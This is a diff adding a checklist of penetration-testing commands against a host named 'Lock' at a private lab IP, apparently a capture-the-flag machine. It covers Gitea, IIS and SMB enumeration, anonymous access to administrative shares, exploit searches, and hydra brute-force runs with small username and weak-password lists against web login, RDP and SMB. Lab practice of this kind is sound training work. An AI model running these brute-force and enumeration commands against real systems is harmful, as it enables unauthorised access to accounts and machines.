@@ -1,0 +1,107 @@
+# SYSTEM 4: LOCK - MANUAL COMMANDS (copy-paste one by one)
+# IP: 10.129.6.226
+# Stop stuck processes first: Press Ctrl+C, then run: killall ffuf enum4linux smbclient
+
+# ============================================
+# GITEA ENUMERATION (Port 3000) - MOST IMPORTANT!
+# ============================================
+
+# 1. Check Gitea homepage
+curl -s http://10.129.6.226:3000/ | head -100
+
+# 2. Check Gitea version
+curl -s http://10.129.6.226:3000/api/v1/version
+
+# 3. Explore public repositories
+curl -s http://10.129.6.226:3000/explore/repos | head -200
+
+# 4. Check for users
+curl -s http://10.129.6.226:3000/api/v1/users/search
+
+# 5. Try to access specific repos (if you find any)
+curl -s http://10.129.6.226:3000/api/v1/repos
+
+# 6. Check Gitea login page
+curl -s http://10.129.6.226:3000/user/login | head -100
+
+# 7. Directory enumeration on Gitea
+ffuf -u http://10.129.6.226:3000/FUZZ -w ~/Downloads/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403 -t 30
+
+# ============================================
+# IIS WEB ENUMERATION (Port 80)
+# ============================================
+
+# 8. Check IIS homepage
+curl -s http://10.129.6.226/ | head -100
+
+# 9. Check common IIS paths
+curl -s http://10.129.6.226/aspnet_client/
+curl -s http://10.129.6.226/iisstart.htm
+
+# 10. Directory enumeration on IIS
+ffuf -u http://10.129.6.226/FUZZ -w ~/Downloads/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403 -t 30
+
+# ============================================
+# SMB ENUMERATION (Port 445)
+# ============================================
+
+# 11. List SMB shares (anonymous)
+smbclient -L //10.129.6.226/ -N
+
+# 12. Try to connect to shares
+smbclient //10.129.6.226/C$ -N
+smbclient //10.129.6.226/ADMIN$ -N
+smbclient //10.129.6.226/IPC$ -N
+
+# ============================================
+# EXPLOIT SEARCH
+# ============================================
+
+# 13. Search for Gitea exploits
+searchsploit gitea
+
+# 14. Search for IIS 10 exploits
+searchsploit "iis 10"
+
+# ============================================
+# BRUTE FORCE (if needed)
+# ============================================
+
+# 15. Create wordlists
+cat > users.txt <<EOF
+administrator
+admin
+lock
+LOCK
+gitea
+git
+EOF
+
+cat > passwords.txt <<EOF
+password
+Password123
+lock
+LOCK
+Lock123
+gitea
+EOF
+
+# 16. Try Gitea login brute force (if login form found)
+hydra -L users.txt -P passwords.txt http-post-form://10.129.6.226:3000/user/login:"user_name=^USER^&password=^PASS^:F=incorrect" -t 4
+
+# 17. Try RDP brute force
+hydra -L users.txt -P passwords.txt rdp://10.129.6.226 -t 4
+
+# 18. Try SMB brute force
+hydra -L users.txt -P passwords.txt smb://10.129.6.226 -t 4
+
+# ============================================
+# NOTES
+# ============================================
+# - Gitea is the most interesting service (port 3000)
+# - Look for public repositories with credentials or sensitive info
+# - Check for Gitea CVEs (version-specific exploits)
+# - IIS might have file upload or .aspx vulnerabilities
+# - SMB might have anonymous access or weak credentials
+
+image.png
